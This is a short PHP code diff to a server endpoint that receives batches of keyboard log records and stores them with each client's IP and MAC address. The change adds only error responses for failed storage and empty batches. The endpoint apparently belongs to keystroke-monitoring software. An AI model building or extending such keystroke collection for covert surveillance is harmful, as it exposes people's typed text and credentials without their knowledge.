@@ -112,6 +112,16 @@ try {
                     if(!is_array($record)){http_response_code(400);echo json_encode(['error'=>'Malformed key record']);exit;}
                 }
                 $inserted_count = $dbService->addKeyLogs($keyLogs, $clientIP, $macAddress);
+                if($inserted_count===false){
+                    http_response_code(500);
+                    echo json_encode(['error'=>'Keyboard log storage unavailable']);
+                    exit;
+                }
+                if($inserted_count===0){
+                    http_response_code(422);
+                    echo json_encode(['error'=>'No valid keyboard records in batch']);
+                    exit;
+                }
                 // Update monitor activity for key logging (pass MAC address)
                 $dbService->updateMonitorActivity($clientIP, 'monitor', $macAddress);
                 $response['data'] = [
